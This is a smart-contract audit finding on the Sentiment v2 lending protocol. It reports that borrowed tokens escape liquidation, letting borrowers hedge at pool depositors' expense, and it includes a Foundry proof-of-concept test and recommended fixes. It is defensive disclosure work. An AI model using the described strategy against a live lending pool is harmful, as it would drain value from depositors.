Rhythmic Cherry Starfish

Medium

# Unliquidatable tokens can be exploited by positions, at the expense of pool depositors

## Summary

Borrowed tokens cannot be seized in a liquidation, despite the protocol recognizing the asset and being able to correctly price it. This results in positions being able to hedge their losses in the case of liquidations, at the expense of pool depositors.

## Vulnerability Detail

In a previous audit, a vulnerability ("C-02 Free Borrowing When Collateral Is The Same Asset") was reported which showed if a pool sets `LTV` for an asset to 100%, then the protocol incorrectly evaluates the health of a postition because the newly borrowed asset is counted as collateral on a position. The recommendation was to not allow borrow and collateral assets to be the same.

The recommendation was implemented by [not allowing pools to set the LTV for their asset](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L177) which results in [positions not being able to borrow if the borrow token was 'added to the position'](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L264-L267) as the LTV for this asset will not be set and the health check will fair.

However, this fix has a downstream impact that the borrowed token is unliquidatable because if the liquidator attempts to seize an asset that is not added to the position, the [liquidation attempt will revert](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L471-L473).

In addition, if the position is being liquidated through the `liquidateBadDebt()` flow, it is also not seized as this call iterates through [only the assets added to a position](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L451-L455) and transfers them to the protocol multisig/governance address.

Essentially after any liquidation, the position will retain the borrowed asset, and have their debt reduced or cleared. This fact can be gamed by positions at the expensive of pool depositors in the following way:

- Position makes a borrow from a pool with high LVR and provides just enough collateral to stay healthy. They are able to utilize the borrowed token in Defi with the `PositionManager::exec()` function.
  - If the price of their collateral declines relative to the borrow token, they can get liquidated and retain the more valuable borrow token which was not liquidatable.
  - If the price of their collateral increases relative to the borrow token, they can repay the borrow token and retain the more valuable collateral tokens.

## Impact

- Positions can hedge against liquidations by holding the borrowed token in their position. As shown, this increases the risk to pool depositors who expected to have a future claim on the token the pool loaned (along with interest they earned).


## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L177
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L264-L267
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L471-L473
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L451-L455

## POC 

Scenario:
1. linearRatePool is created offering loans with 98% LVR on assset 1, user1 deposits assets.
2. User2 creates a position and deposits 1.021e18 worth of asset2 as collateral and adds this token to their position
3. The position borrows 1e18 worth of asset1 from fixedRatePool and is healthy
    The position:
    - totalAssets: 1.021e18
    - totalDebt: 1e18
    - minReqAssets: 1.020e18    
    - total unrecognized assets: 1e18 (asset1 cannot be added to their position)
4. The value of asset2 declines by ~3% in a single price update and is now worth 0.99e18, User2's position becomes undercollateralized
5. The protocol owner calls `liquidateBadDebt()` on this position:
    - Assets worth ~0.99e18 eth are sent to the protocol multisig
    - Debt worth 1e18 eth is socialized among pool depositors
    - Debt is removed from the position
    - 1e18 eth worth of asset1 remains on the position
6. User2 profited from the liquidation of their position at the expense of the pool depositor..


First update the min/max LTV settings in `BaseTest.t.sol` to reflect those in the contest readme:

```diff
    function setUp() public virtual {
        Deploy.DeployParams memory params = Deploy.DeployParams({
            owner: protocolOwner,
            proxyAdmin: proxyAdmin,
            feeRecipient: address(this),
-           minLtv: 2e17, // 0.1
-           maxLtv: 8e17, // 0.8
+           minLtv: 1e17, // 0.1
+           maxLtv: 9.8e17, // 0.98
            minDebt: 0,
            minBorrow: 0,
            liquidationFee: 0,
            liquidationDiscount: 200_000_000_000_000_000,
            badDebtLiquidationDiscount: 1e16,
            defaultOriginationFee: 0,
            defaultInterestFee: 0
        });
```

Then paste/run the following test in `LiquidationTest.t.sol`:

```javascript
    function test_POC_PositionBenefitsFromBorrowTokenBeingUnliquidatable() public {
        // 1. linearRatePool is created offering loans with 98% LVR on assset 1, user1 deposits assets.
        vm.startPrank(poolOwner); 
        riskEngine.requestLtvUpdate(linearRatePool, address(asset2), 0.98e18); 
        riskEngine.acceptLtvUpdate(linearRatePool, address(asset2));
        vm.stopPrank();

        vm.startPrank(user);
        asset1.mint(user, 2e18);
        asset1.approve(address(pool), 2e18);
        pool.deposit(linearRatePool, 2e18, user);
        vm.stopPrank();

        // 2. User2 creates a position and deposits 1.021e18 worth of asset2 as collateral and adds this token to their position
        vm.startPrank(user2);
        asset2.mint(user2, 2e18);
        asset2.approve(address(positionManager), 2e18);
        
        Action[] memory actions = new Action[](4);
        (position, actions[0]) = newPosition(user2, bytes32(uint256(0x123456789)));
        actions[1] = deposit(address(asset2), 1.021e18);
        actions[2] = addToken(address(asset2));


        // 3. The position borrows 1e18 worth of asset1 from fixedRatePool and is healthy
        //     The position:
        //     - totalAssets: 1.021e18
        //     - totalDebt: 1e18
        //     - minReqAssets: 1.020e18    
        //     - total unrecognized assets: 1e18 (asset1 cannot be added to their position)
        actions[3] = borrow(linearRatePool, 1e18);
        positionManager.processBatch(position, actions);
        assertTrue(riskEngine.isPositionHealthy(position));
        vm.stopPrank();

        // 4. The value of asset2 declines by ~3% in a single price update and is now worth 0.99e18, User2's position becomes undercollateralized
        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(0.97e18); // 3% decline in collateral value
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
        riskEngine.validateBadDebt(position);
        vm.stopPrank();

        // 5. The protocol owner calls `liquidateBadDebt()` on this position:
        //     - Assets worth ~0.99e18 eth are sent to the protocol multisig
        //     - Debt worth 1e18 eth is socialized among pool depositors
        //     - Debt is removed from the position
        //     - 1e18 eth worth of asset1 remains on the position
        uint256 pre_User1PoolAssets = pool.getAssetsOf(linearRatePool, user);
        (uint256 pre_totalAssetValue, ,) = riskEngine.getRiskData(position);

        vm.startPrank(address(protocolOwner));
        positionManager.liquidateBadDebt(position);
        vm.stopPrank();

        uint256 post_User1PoolAssets = pool.getAssetsOf(linearRatePool, user);
        (uint256 post_totalAssetValue, ,) = riskEngine.getRiskData(position);

        // 6. User2 profited from the liquidation of their position at the expense of the pool depositor.
        uint256 positionLostDueToLiquidation = pre_totalAssetValue - post_totalAssetValue;
        uint256 valueOfRetainedUnliquidatableAsset = protocol.riskModule().getAssetValue(position, address(asset1));

        assert(valueOfRetainedUnliquidatableAsset > positionLostDueToLiquidation); // postion profited from liquidation, ie. the entire borrowed asset was retained by the position which was more valuable than the assets lost due to liquidation
        assert(post_User1PoolAssets < pre_User1PoolAssets); // the profit made by the position owner was at the expense of pool depositor - user1
    }
```


## Tool used

Manual Review

## Recommendation

- Now that the valid range of LTVs a can set for an asset does not include 100% (according to the contest readme https://audits.sherlock.xyz/contests/349), borrow tokens could be added to positions to be considered collateral. The position would still need to add external collateral to remain healthy.

- Or, continue to not consider the value borrow token for the purposes of position health checks, but allow liquidations to seize the borrowed token as well as any other known asset to the protocol. This prevents the position from retaining valuable assets upon liquidation.